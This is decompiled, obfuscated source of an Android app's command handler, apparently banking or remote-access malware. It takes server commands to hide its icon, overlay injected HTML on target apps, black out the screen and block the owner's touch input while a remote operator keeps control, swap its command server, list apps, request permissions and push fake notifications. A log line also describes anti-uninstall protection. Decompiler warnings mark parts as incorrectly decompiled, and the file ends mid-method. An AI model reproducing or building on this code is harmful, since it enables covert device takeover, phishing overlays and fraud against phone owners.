package com.storm.safe.rock.service.modules.command;

import android.content.ContentResolver;
import android.media.AudioManager;
import android.provider.Settings;
import com.storm.safe.rock.inject.jbqfkndyx;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.util.StringUtil;
import java.io.File;
import java.util.Set;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlinx.coroutines.AbstractC0780a0;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC1262tj;
import p000.AbstractC1517zh;
import p000.C0454ef;
import p000.C0614i9;
import p000.C1180rh;
import p000.C1289u6;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.RunnableC0449ea;
import p000.b81;
import p000.fd0;
import p000.ju0;
import p000.kg1;
import p000.kj1;
import p000.sc0;
import p000.t60;
import p000.tz0;
import p000.uz0;
import p000.yj1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a1 */
/* loaded from: classes2.dex */
public final class C0344a1 implements InterfaceC0726jp {
    static {
        new C1289u6(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("GET_APP_LIST", "LAUNCH_APP", "HIDE_APP", "SHOW_APP", "CHANGE_SERVER_URL", "BLACKLIST_DEVICE", "DEVICE_BLOCK_INPUT", "DEVICE_ALLOW_INPUT", "ENABLE_LOGGING", "LOG_ENABLE", "DISABLE_LOGGING", "LOG_DISABLE", "SET_BRIGHTNESS", "set_brightness", "MUTE", "mute", "VOLUME_UP", "VOLUME_DOWN", "GET_PERMISSIONS", "REQUEST_PERMISSION", "SHOW_INJECTION", "STOP_INJECTION", "SEND_NOTIFICATION");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x0115, code lost:
    
        if (r25.equals("LOG_ENABLE") == false) goto L4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x011f, code lost:
    
        if (r25.equals("ENABLE_LOGGING") == false) goto L4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x0123, code lost:
    
        p000.t60.m214714d6("AppCmdHandler", "收到启用日志记录命令");
        r27.f60536a0.m211459e8();
        r27.m214880b6("日志记录已启用", true);
     */
    /* JADX WARN: Code restructure failed: missing block: B:81:0x0132, code lost:
    
        return r9;
     */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0379 A[PHI: r17
      0x0379: PHI (r17v13 vv) = (r17v12 vv), (r17v14 vv) binds: [B:133:0x0375, B:130:0x0369] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:199:0x04e5  */
    /* JADX WARN: Removed duplicated region for block: B:319:0x0702  */
    /* JADX WARN: Removed duplicated region for block: B:323:0x0715  */
    /* JADX WARN: Removed duplicated region for block: B:324:0x0716  */
    /* JADX WARN: Removed duplicated region for block: B:326:0x071a A[Catch: Exception -> 0x0734, TryCatch #6 {Exception -> 0x0734, blocks: (B:321:0x070f, B:326:0x071a, B:328:0x0720, B:331:0x0736, B:332:0x074a), top: B:386:0x070f }] */
    /* JADX WARN: Removed duplicated region for block: B:332:0x074a A[Catch: Exception -> 0x0734, TRY_LEAVE, TryCatch #6 {Exception -> 0x0734, blocks: (B:321:0x070f, B:326:0x071a, B:328:0x0720, B:331:0x0736, B:332:0x074a), top: B:386:0x070f }] */
    /* JADX WARN: Removed duplicated region for block: B:4:0x0024  */
    /* JADX WARN: Removed duplicated region for block: B:5:0x0026 A[PHI: r17
      0x0026: PHI (r17v24 vv) = (r17v12 vv), (r17v14 vv), (r17v15 vv), (r17v18 vv), (r17v18 vv), (r17v25 vv) binds: [B:133:0x0375, B:130:0x0369, B:128:0x0320, B:122:0x028e, B:121:0x0222, B:4:0x0024] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x00e4  */
    /* JADX WARN: Removed duplicated region for block: B:69:0x00fe A[RETURN] */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) throws Throwable {
        C1351vv c1351vv;
        String str2;
        ju0 ju0Var;
        boolean z;
        C0614i9 c0614i9;
        Object objM213696a7;
        ju0 ju0Var2;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        switch (str.hashCode()) {
            case -2090823614:
                c1351vv = c1351vv2;
                if (str.equals("SEND_NOTIFICATION")) {
                    String strOptString = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    if (strOptString == null) {
                        strOptString = "";
                    }
                    String strOptString2 = jSONObject != null ? jSONObject.optString("appName", "") : null;
                    if (strOptString2 == null) {
                        strOptString2 = "";
                    }
                    String strOptString3 = jSONObject != null ? jSONObject.optString("title", "") : null;
                    if (strOptString3 == null) {
                        strOptString3 = "";
                    }
                    String strOptString4 = jSONObject != null ? jSONObject.optString("content", "") : null;
                    if (strOptString4 == null) {
                        strOptString4 = "";
                    }
                    String strOptString5 = jSONObject != null ? jSONObject.optString("buttonText", "") : null;
                    str2 = strOptString5 != null ? strOptString5 : "";
                    if (strOptString.length() == 0 || strOptString4.length() == 0) {
                        t60.m214726f4("AppCmdHandler", "通知参数不完整");
                    } else {
                        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("发送通知: ", strOptString3, " - ", strOptString4, " (目标: ");
                        sbM41c2.append(strOptString);
                        sbM41c2.append(", 按钮: ");
                        sbM41c2.append(str2);
                        sbM41c2.append(")");
                        t60.m214714d6("AppCmdHandler", sbM41c2.toString());
                        try {
                            uz0Var.m214885c1(strOptString, strOptString2, strOptString3, strOptString4, str2);
                            t60.m214714d6("AppCmdHandler", "通知已发送");
                        } catch (Exception e) {
                            t60.m214705c6("AppCmdHandler", "发送通知失败", e);
                        }
                    }
                }
                return c1351vv;
            case -1897017234:
                c1351vv = c1351vv2;
                ju0Var = null;
                if (str.equals("SET_BRIGHTNESS")) {
                    int iOptInt = jSONObject != null ? jSONObject.optInt("brightness", 50) : 50;
                    AbstractC0003a2.m44c5("收到设置屏幕亮度命令: ", iOptInt, "%", "AppCmdHandler");
                    try {
                        ju0Var2 = uz0Var.f60536a0.f52433g4;
                        if (ju0Var2 != null) {
                            ju0Var2 = ju0Var;
                        }
                        if (ju0Var2 != null) {
                            t60.m214726f4("AppCmdHandler", "ScreenBrightnessManager 未初始化");
                        } else if (ju0Var2.m213353a3(iOptInt)) {
                            t60.m214714d6("AppCmdHandler", "屏幕亮度设置成功: " + iOptInt + "%");
                        } else {
                            t60.m214726f4("AppCmdHandler", "屏幕亮度设置失败: " + iOptInt + "%");
                        }
                    } catch (Exception e2) {
                        t60.m214705c6("AppCmdHandler", "设置屏幕亮度异常", e2);
                    }
                }
                return c1351vv;
            case -1678939921:
                c1351vv = c1351vv2;
                if (str.equals("DEVICE_BLOCK_INPUT")) {
                    t60.m214714d6("AppCmdHandler", "阻断手机操作");
                    dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                    try {
                        if (!dqtvuisjdVar.f52469k0) {
                            t60.m214726f4("dqtvuisjd", "⚠️ 阻断操作只能在黑屏遮挡开启时使用");
                            dqtvuisjdVar.m211516l3("阻断操作失败：请先开启黑屏遮挡");
                        } else if (dqtvuisjdVar.f52423f4 != null) {
                            try {
                                if (dqtvuisjdVar.performGlobalAction(2)) {
                                    t60.m214714d6("dqtvuisjd", "🏠 已执行返回主页命令");
                                } else {
                                    t60.m214726f4("dqtvuisjd", "⚠️ 返回主页命令执行失败");
                                }
                            } catch (Exception e3) {
                                t60.m214705c6("dqtvuisjd", "❌ 执行返回主页命令失败", e3);
                            }
                            fd0 fd0Var = dqtvuisjdVar.f52423f4;
                            if (fd0Var == null) {
                                t60.m214724f2("maskOverlayManager");
                                throw null;
                            }
                            try {
                                C0454ef c0454ef = fd0Var.f56199a1;
                                if (c0454ef != null) {
                                    c0454ef.f55996b8.post(new RunnableC0449ea(true, c0454ef));
                                }
                            } catch (Exception e4) {
                                t60.m214705c6("MaskOverlayManager", "❌ 启用触摸拦截失败", e4);
                            }
                            t60.m214714d6("dqtvuisjd", "🚫 触摸拦截已启用：手机端用户无法操作，但控制端操作不受影响");
                            dqtvuisjdVar.m211516l3("触摸拦截已启用");
                        } else {
                            t60.m214726f4("dqtvuisjd", "⚠️ MaskOverlayManager未初始化");
                        }
                    } catch (Exception e5) {
                        t60.m214705c6("dqtvuisjd", "❌ 阻止设备用户输入失败", e5);
                    }
                }
                return c1351vv;
            case -1563410955:
                c1351vv = c1351vv2;
                if (str.equals("SHOW_INJECTION")) {
                    String strOptString6 = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    if (strOptString6 == null) {
                        strOptString6 = "";
                    }
                    String strOptString7 = jSONObject != null ? jSONObject.optString("htmlContent", "") : null;
                    str2 = strOptString7 != null ? strOptString7 : "";
                    if (strOptString6.length() == 0 || str2.length() == 0) {
                        t60.m214726f4("AppCmdHandler", "注入参数不完整");
                    } else {
                        t60.m214714d6("AppCmdHandler", "记录注入任务: " + strOptString6 + ", htmlContent长度=" + str2.length());
                        try {
                            uz0Var.getClass();
                            dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
                            dqtvuisjdVar2.m211439c1(strOptString6, str2);
                            dqtvuisjdVar2.m211529m7();
                        } catch (Exception e6) {
                            t60.m214705c6("AppCmdHandler", "记录注入任务失败", e6);
                        }
                    }
                }
                return c1351vv;
            case -1550562645:
                c1351vv = c1351vv2;
                if (str.equals("DEVICE_ALLOW_INPUT")) {
                    t60.m214714d6("AppCmdHandler", "允许手机操作");
                    dqtvuisjd dqtvuisjdVar3 = uz0Var.f60536a0;
                    try {
                        if (dqtvuisjdVar3.f52469k0) {
                            fd0 fd0Var2 = dqtvuisjdVar3.f52423f4;
                            if (fd0Var2 != null) {
                                try {
                                    C0454ef c0454ef2 = fd0Var2.f56199a1;
                                    if (c0454ef2 != null) {
                                        c0454ef2.f55996b8.post(new RunnableC0449ea(false, c0454ef2));
                                    }
                                } catch (Exception e7) {
                                    t60.m214705c6("MaskOverlayManager", "❌ 禁用触摸拦截失败", e7);
                                }
                                t60.m214714d6("dqtvuisjd", "✅ 触摸拦截已禁用：手机端用户可以操作");
                                dqtvuisjdVar3.m211516l3("触摸拦截已禁用");
                            } else {
                                t60.m214726f4("dqtvuisjd", "⚠️ MaskOverlayManager未初始化");
                            }
                        } else {
                            t60.m214726f4("dqtvuisjd", "⚠️ 允许操作只能在黑屏遮挡开启时使用");
                            dqtvuisjdVar3.m211516l3("允许操作失败：请先开启黑屏遮挡");
                        }
                    } catch (Exception e8) {
                        t60.m214705c6("dqtvuisjd", "❌ 恢复设备用户输入失败", e8);
                    }
                }
                return c1351vv;
            case -1368205093:
                c1351vv = c1351vv2;
                if (str.equals("GET_PERMISSIONS")) {
                    t60.m214714d6("AppCmdHandler", "获取权限状态");
                    Object objM213696a72 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new AppCommandHandler$handleGetPermissions$2(uz0Var, uz0Var.m214869a5(), null), interfaceC0876mv);
                    CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                    if (objM213696a72 != coroutineSingletons) {
                        objM213696a72 = c1351vv;
                    }
                    if (objM213696a72 == coroutineSingletons) {
                        return objM213696a72;
                    }
                }
                return c1351vv;
            case -1095522118:
                c1351vv = c1351vv2;
                if (str.equals("STOP_INJECTION")) {
                    String strOptString8 = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    str2 = strOptString8 != null ? strOptString8 : "";
                    if (str2.length() == 0) {
                        t60.m214726f4("AppCmdHandler", "停止注入参数不完整");
                    } else {
                        t60.m214714d6("AppCmdHandler", "停止注入任务: ".concat(str2));
                        try {
                            uz0Var.getClass();
                            uz0Var.f60536a0.m211448d3(str2);
                            jbqfkndyx.f51944a4.finishForPackage(str2);
                            t60.m214714d6("AppCmdHandler", "已停止注入任务并关闭注入页面: ".concat(str2));
                        } catch (Exception e9) {
                            t60.m214705c6("AppCmdHandler", "停止注入任务失败", e9);
                        }
                    }
                }
                return c1351vv;
            case -990015100:
                c1351vv = c1351vv2;
                if (str.equals("HIDE_APP")) {
                    t60.m214714d6("AppCmdHandler", "隐藏桌面图标");
                    uz0Var.f60536a0.m211475g9();
                    return c1351vv;
                }
                return c1351vv;
            case -796714835:
                c1351vv = c1351vv2;
                if (str.equals("LOG_DISABLE")) {
                    t60.m214714d6("AppCmdHandler", "收到禁用日志记录命令");
                    dqtvuisjd dqtvuisjdVar4 = uz0Var.f60536a0;
                    String str3 = AbstractC0315a0.f53025a0;
                    AbstractC0315a0.f53032a7 = false;
                    AbstractC0315a0.f53034a9 = false;
                    AbstractC0315a0.f53035b0 = false;
                    AbstractC0315a0.f53036b1 = false;
                    dqtvuisjdVar4.f52411e2 = false;
                    c0614i9 = dqtvuisjdVar4.f52414e5;
                    if (c0614i9 != null) {
                        c0614i9.f56827a7 = false;
                    }
                    try {
                        dqtvuisjdVar4.getSharedPreferences(StringUtil.m212470a0("J1YWPUQ2CxFEJSpNFA=="), 0).edit().putBoolean(StringUtil.m212470a0("J1YWPUQ2CxFSPypbHT9J"), false).apply();
                        t60.m214714d6("dqtvuisjd", "✅ 日志记录已禁用并持久化保存");
                    } catch (Exception unused) {
                    }
                    uz0Var.m214880b6("日志记录已禁用", false);
                }
                return c1351vv;
            case -469795425:
                c1351vv = c1351vv2;
                if (str.equals("REQUEST_PERMISSION")) {
                    String strOptString9 = jSONObject != null ? jSONObject.optString("permission", "") : null;
                    str2 = strOptString9 != null ? strOptString9 : "";
                    t60.m214714d6("AppCmdHandler", "请求权限: ".concat(str2));
                    C1180rh c1180rh = AbstractC1262tj.f60233a0;
                    Object objM213696a73 = AbstractC0780a0.m213696a7(sc0.f59953a0, new AppCommandHandler$handleRequestPermission$2(str2, uz0Var, null), interfaceC0876mv);
                    CoroutineSingletons coroutineSingletons2 = CoroutineSingletons.f57606a0;
                    if (objM213696a73 != coroutineSingletons2) {
                        objM213696a73 = c1351vv;
                    }
                    if (objM213696a73 == coroutineSingletons2) {
                        return objM213696a73;
                    }
                }
                return c1351vv;
            case -412592379:
                c1351vv = c1351vv2;
                if (str.equals("GET_APP_LIST")) {
                    boolean zOptBoolean = jSONObject != null ? jSONObject.optBoolean("includeSystem", false) : false;
                    boolean zOptBoolean2 = jSONObject != null ? jSONObject.optBoolean("includeIcon", true) : true;
                    String strOptString10 = jSONObject != null ? jSONObject.optString("requestId", "") : null;
                    String str4 = strOptString10 == null ? "" : strOptString10;
                    t60.m214714d6("AppCmdHandler", "获取应用列表: includeSystem=" + zOptBoolean + ", includeIcon=" + zOptBoolean2);
                    C0323a8 c0323a8M214869a5 = uz0Var.m214869a5();
                    C0260a2 c0260a2 = uz0Var.f60536a0.f52369a0;
                    Object objM213696a74 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new AppCommandHandler$handleGetAppList$2(uz0Var, zOptBoolean, zOptBoolean2, c0260a2 != null ? c0260a2 : null, c0323a8M214869a5, str4, null), interfaceC0876mv);
                    CoroutineSingletons coroutineSingletons3 = CoroutineSingletons.f57606a0;
                    if (objM213696a74 != coroutineSingletons3) {
                        objM213696a74 = c1351vv;
                    }
                    if (objM213696a74 == coroutineSingletons3) {
                        return objM213696a74;
                    }
                }
                return c1351vv;
            case -105107496:
                c1351vv = c1351vv2;
                if (str.equals("BLACKLIST_DEVICE")) {
                    t60.m214714d6("AppCmdHandler", "收到黑名单封杀命令，强制修改所有服务器地址为: wss://www.google.com");
                    try {
                        dqtvuisjd dqtvuisjdVar5 = uz0Var.f60536a0;
                        dqtvuisjdVar5.getSharedPreferences(StringUtil.m212470a0("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0).edit().putString(StringUtil.m212470a0("OFwDLEgqMztFPQ=="), "wss://www.google.com").apply();
                        File file = new File(dqtvuisjdVar5.getFilesDir(), StringUtil.m212470a0("OFwDLEgqMy1YPy1QFnRHKwMg"));
                        try {
                            JSONObject jSONObject2 = file.exists() ? new JSONObject(AbstractC1517zh.m215420f8(file)) : new JSONObject();
                            jSONObject2.put(StringUtil.m212470a0("OFwDLEgqOTxb"), "wss://www.google.com");
                            String string = jSONObject2.toString();
                            t60.m214694b5(string, "configJson.toString()");
                            AbstractC1517zh.m215422g0(file, string);
                        } catch (Exception unused2) {
                            AbstractC1517zh.m215422g0(file, "{StringUtil.d(\"OFwDLEgqOTxb\"):\"wss://www.google.com\"}");
                        }
                        t60.m214714d6("AppCmdHandler", "所有服务器配置已改为: wss://www.google.com");
                        uz0Var.f60536a0.m211443c8("wss://www.google.com");
                    } catch (Exception e10) {
                        tz0.m214807a7("黑名单封杀执行失败: ", e10.getMessage(), "AppCmdHandler");
                    }
                }
                return c1351vv;
            case 2378265:
                c1351vv = c1351vv2;
                if (str.equals("MUTE")) {
                    Object objM211876a3 = m211876a3(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv);
                    if (objM211876a3 == CoroutineSingletons.f57606a0) {
                        return objM211876a3;
                    }
                }
                return c1351vv;
            case 3363353:
                c1351vv = c1351vv2;
                if (!str.equals("mute")) {
                }
                return c1351vv;
            case 445069759:
                if (str.equals("SHOW_APP")) {
                    t60.m214714d6("AppCmdHandler", "显示桌面图标");
                    dqtvuisjd dqtvuisjdVar6 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "📱 开始显示应用桌面图标 - 使用新的管理器");
                        z = dqtvuisjdVar6.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).getBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), false);
                    } catch (Exception e11) {
                        e = e11;
                        c1351vv = c1351vv2;
                    }
                    if (dqtvuisjdVar6.f52475k6 || z) {
                        C0328b3 c0328b3 = dqtvuisjdVar6.f52434g5;
                        try {
                        } catch (Exception e12) {
                            e = e12;
                            t60.m214705c6("dqtvuisjd", "❌ 显示应用图标异常", e);
                            String message = e.getMessage();
                            if (message == null) {
                                message = "未知异常";
                            }
                            AbstractC0770a1.m213614f9(new Pair("error", message), new Pair("stackTrace", kj1.m213589d6(e)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                            dqtvuisjd.m211435k0("SYSTEM_ERROR", "显示应用图标异常");
                            dqtvuisjdVar6.m211513l0("系统异常: " + e.getMessage(), true);
                            return c1351vv;
                        }
                        if (c0328b3 == null) {
                            t60.m214724f2("appIconHideManager");
                            throw null;
                        }
                        yj1 yj1VarM211761a5 = c0328b3.m211761a5();
                        String str5 = yj1VarM211761a5.f61331a4;
                        String str6 = yj1VarM211761a5.f61329a2;
                        String str7 = yj1VarM211761a5.f61328a1;
                        c1351vv = c1351vv2;
                        if (yj1VarM211761a5.f61327a0) {
                            dqtvuisjdVar6.f52475k6 = false;
                            t60.m214714d6("dqtvuisjd", "✅ 应用图标显示成功，使用方案: " + str7);
                            dqtvuisjdVar6.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), false).apply();
                            dqtvuisjdVar6.m211507k3();
                            dqtvuisjdVar6.f52476k7 = null;
                            if (dqtvuisjdVar6.f52477k8) {
                                t60.m214714d6("dqtvuisjd", "🛡️ 防卸载保护已启用，无需重新启用");
                            } else {
                                t60.m214714d6("dqtvuisjd", "🛡️ 显示应用后，重新启用防卸载保护");
                                dqtvuisjdVar6.m211460e9();
                            }
                            AbstractC0770a1.m213614f9(new Pair("action", "SHOW_APP_ICON_SUCCESS"), new Pair("method", str7), new Pair("deviceCompatibility", str5), new Pair("attemptedMethods", AbstractC0715je.m213295i2(yj1VarM211761a5.f61330a3, ",", null, null, null, 62)), new Pair("note", "应用图标已重新显示在桌面"), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                            dqtvuisjd.m211435k0("SYSTEM_EVENT", "显示应用图标成功");
                            dqtvuisjdVar6.m211513l0("应用图标已成功显示，使用方案: " + str7, false);
                        } else {
                            t60.m214704c5("dqtvuisjd", "❌ 所有显示方案均失败: " + str6);
                            AbstractC0770a1.m213614f9(new Pair("action", "SHOW_APP_ICON_FAILED"), new Pair("error", str6), new Pair("deviceCompatibility", str5), new Pair("attemptedMethods", AbstractC0715je.m213295i2(yj1VarM211761a5.f61330a3, ",", null, null, null, 62)), new Pair("recommendedAction", yj1VarM211761a5.f61332a5), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
                            dqtvuisjd.m211435k0("SYSTEM_ERROR", "显示应用图标失败");
                            dqtvuisjdVar6.m211513l0("显示失败: " + str6, true);
                        }
                    } else {
                        t60.m214726f4("dqtvuisjd", "⚠️ 应用图标已经处于显示状态");
                        dqtvuisjdVar6.m211513l0("应用图标已经处于显示状态", false);
                        c1351vv = c1351vv2;
                    }
                } else {
                    c1351vv = c1351vv2;
                }
                return c1351vv;
            case 658343392:
                if (str.equals("VOLUME_UP")) {
                    t60.m214714d6("AppCmdHandler", "收到音量+命令");
                    uz0Var.m214879b5("收到音量+命令");
                    try {
                        Object systemService = uz0Var.f60536a0.getSystemService("audio");
                        AudioManager audioManager = systemService instanceof AudioManager ? (AudioManager) systemService : null;
                        if (audioManager == null) {
                            t60.m214704c5("AppCmdHandler", "AudioManager 获取失败");
                        } else {
                            audioManager.adjustVolume(1, 1);
                            t60.m214714d6("AppCmdHandler", "已增加音量");
                        }
                    } catch (Exception e13) {
                        t60.m214705c6("AppCmdHandler", "增加音量异常", e13);
                    }
                    CoroutineSingletons coroutineSingletons4 = CoroutineSingletons.f57606a0;
                    return c1351vv2;
                }
                c1351vv = c1351vv2;
                return c1351vv;
            case 734389379:
                break;
            case 838295294:
                break;
            case 974415048:
                if (str.equals("DISABLE_LOGGING")) {
                    c1351vv = c1351vv2;
                    t60.m214714d6("AppCmdHandler", "收到禁用日志记录命令");
                    dqtvuisjd dqtvuisjdVar42 = uz0Var.f60536a0;
                    String str32 = AbstractC0315a0.f53025a0;
                    AbstractC0315a0.f53032a7 = false;
                    AbstractC0315a0.f53034a9 = false;
                    AbstractC0315a0.f53035b0 = false;
                    AbstractC0315a0.f53036b1 = false;
                    dqtvuisjdVar42.f52411e2 = false;
                    c0614i9 = dqtvuisjdVar42.f52414e5;
                    if (c0614i9 != null) {
                    }
                    dqtvuisjdVar42.getSharedPreferences(StringUtil.m212470a0("J1YWPUQ2CxFEJSpNFA=="), 0).edit().putBoolean(StringUtil.m212470a0("J1YWPUQ2CxFSPypbHT9J"), false).apply();
                    t60.m214714d6("dqtvuisjd", "✅ 日志记录已禁用并持久化保存");
                    uz0Var.m214880b6("日志记录已禁用", false);
                    return c1351vv;
                }
                c1351vv = c1351vv2;
                return c1351vv;
            case 1032794997:
                if (str.equals("LAUNCH_APP")) {
                    String strOptString11 = jSONObject != null ? jSONObject.optString("packageName", "") : null;
                    str2 = strOptString11 != null ? strOptString11 : "";
                    if (str2.length() == 0) {
                        objM213696a7 = c1351vv2;
                        if (objM213696a7 == CoroutineSingletons.f57606a0) {
                            return objM213696a7;
                        }
                    } else {
                        objM213696a7 = AbstractC0780a0.m213696a7(AbstractC1262tj.f60234a1, new AppCommandHandler$handleLaunchApp$2(uz0Var, str2, uz0Var.m214869a5(), null), interfaceC0876mv);
                        if (objM213696a7 != CoroutineSingletons.f57606a0) {
                        }
                        if (objM213696a7 == CoroutineSingletons.f57606a0) {
                        }
                    }
                    return c1351vv;
                }
                c1351vv = c1351vv2;
                return c1351vv;
            case 1307302567:
                if (str.equals("VOLUME_DOWN")) {
                    t60.m214714d6("AppCmdHandler", "收到音量-命令");
                    uz0Var.m214879b5("收到音量-命令");
                    try {
                        Object systemService2 = uz0Var.f60536a0.getSystemService("audio");
                        AudioManager audioManager2 = systemService2 instanceof AudioManager ? (AudioManager) systemService2 : null;
                        if (audioManager2 == null) {
                            t60.m214704c5("AppCmdHandler", "AudioManager 获取失败");
                        } else {
                            audioManager2.adjustVolume(-1, 1);
                            t60.m214714d6("AppCmdHandler", "已减少音量");
                        }
                    } catch (Exception e14) {
                        t60.m214705c6("AppCmdHandler", "减少音量异常", e14);
                    }
                    CoroutineSingletons coroutineSingletons5 = CoroutineSingletons.f57606a0;
                    return c1351vv2;
                }
                c1351vv = c1351vv2;
                return c1351vv;
            case 1510203970:
                if (str.equals("CHANGE_SERVER_URL")) {
                    String strOptString12 = jSONObject != null ? jSONObject.optString(StringUtil.m212470a0("OFwDLEgqOTxb"), "") : null;
                    if (strOptString12 == null) {
                        strOptString12 = "";
                    }
                    if (strOptString12.length() == 0) {
                        JSONObject jSONObjectOptJSONObject = jSONObject != null ? jSONObject.optJSONObject("data") : null;
                        String strOptString13 = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString(StringUtil.m212470a0("OFwDLEgqOTxb"), "") : null;
                        strOptString12 = strOptString13 != null ? strOptString13 : "";
                    }
                    if (strOptString12.length() <= 0) {
                        t60.m214726f4("AppCmdHandler", "CHANGE_SERVER_URL 参数无效，serverUrl 为空");
                        return c1351vv2;
                    }
                    t60.m214714d6("AppCmdHandler", "收到修改服务器地址命令: ".concat(strOptString12));
                    uz0Var.f60536a0.m211443c8(strOptString12);
                    return c1351vv2;
                }
                c1351vv = c1351vv2;
                return c1351vv;
            case 1951568974:
                if (str.equals("set_brightness")) {
                    c1351vv = c1351vv2;
                    ju0Var = null;
                    if (jSONObject != null) {
                    }
                    AbstractC0003a2.m44c5("收到设置屏幕亮度命令: ", iOptInt, "%", "AppCmdHandler");
                    ju0Var2 = uz0Var.f60536a0.f52433g4;
                    if (ju0Var2 != null) {
                    }
                    if (ju0Var2 != null) {
                    }
                    return c1351vv;
                }
                c1351vv = c1351vv2;
                return c1351vv;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(14:0|2|(2:4|(1:6)(1:7))(0)|8|118|(1:(2:11|(10:13|132|14|15|64|65|130|81|85|115)(2:18|19))(2:20|21))(12:25|(1:27)(1:28)|29|(1:31)(1:32)|33|(1:35)(1:37)|36|38|39|(1:41)(1:45)|42|(2:47|48)(2:49|(4:51|52|(1:54)|62)(18:87|121|88|89|128|92|93|116|97|(1:99)|100|(1:102)|103|104|119|108|112|115)))|55|(1:(5:59|123|60|(3:63|15|64)|62))(1:72)|65|130|81|85|115|(1:(0))) */
    /* JADX WARN: Code restructure failed: missing block: B:83:0x0175, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:84:0x0176, code lost:
    
        p000.t60.m214726f4("AppCmdHandler", "关闭触觉反馈失败: " + r0.getMessage());
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:7:0x002d  */
    /* JADX WARN: Type inference failed for: r1v0, types: [uz0] */
    /* JADX WARN: Type inference failed for: r1v1 */
    /* JADX WARN: Type inference failed for: r1v13, types: [android.content.ContentResolver] */
    /* JADX WARN: Type inference failed for: r1v14 */
    /* JADX WARN: Type inference failed for: r1v15 */
    /* JADX WARN: Type inference failed for: r1v16 */
    /* JADX WARN: Type inference failed for: r1v20, types: [android.content.ContentResolver] */
    /* JADX WARN: Type inference failed for: r1v21 */
    /* JADX WARN: Type inference failed for: r1v22 */
    /* JADX WARN: Type inference failed for: r1v29 */
    /* JADX WARN: Type inference failed for: r1v3 */
    /* JADX WARN: Type inference failed for: r1v30 */
    /* JADX WARN: Type inference failed for: r5v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r5v5, types: [android.media.AudioManager] */
    /* JADX WARN: Type inference failed for: r5v8 */
    /* JADX WARN: Type inference failed for: r5v9 */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211876a3(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        AppCommandHandler$handleMute$1 appCommandHandler$handleMute$1;
        ContentResolver contentResolver;
        String str;
        String str2;
        AudioManager audioManager;
        ?? r1 = uz0Var;
        C1351vv c1351vv = C1351vv.f60710b1;
        AudioManager audioManager2 = "恢复触觉反馈失败: ";
        if (continuationImpl instanceof AppCommandHandler$handleMute$1) {
            appCommandHandler$handleMute$1 = (AppCommandHandler$handleMute$1) continuationImpl;
            int i = appCommandHandler$handleMute$1.f53435a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                appCommandHandler$handleMute$1.f53435a4 = i - Integer.MIN_VALUE;
            } else {
                appCommandHandler$handleMute$1 = new AppCommandHandler$handleMute$1(this, continuationImpl);
            }
        }
        Object obj = appCommandHandler$handleMute$1.f53433a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = appCommandHandler$handleMute$1.f53435a4;
        int i3 = 1;
        try {
            try {
            } catch (Exception e) {
                t60.m214705c6("AppCmdHandler", "设置静音异常", e);
            }
        } catch (Exception e2) {
            e = e2;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
